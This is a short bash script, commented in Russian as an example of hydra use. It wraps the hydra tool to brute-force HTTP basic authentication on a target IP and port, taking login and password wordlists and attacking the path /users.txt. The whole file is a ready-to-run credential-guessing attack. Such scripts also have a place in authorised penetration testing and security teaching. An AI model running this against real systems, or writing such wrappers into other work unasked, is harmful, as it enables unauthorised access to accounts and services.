#!/bin/bash
# Пример использования hydra для http-get basic auth
if [ $# -lt 4 ]; then
  echo "Usage: $0 <TARGET_IP> <PORT> <LOGINS_FILE> <PASSWORDS_FILE>"
  exit 1
fi
TARGET=$1
PORT=$2
LOGINS=$3
PASSES=$4
hydra -L "$LOGINS" -P "$PASSES" -s "$PORT" -f "$TARGET" http-get /users.txt
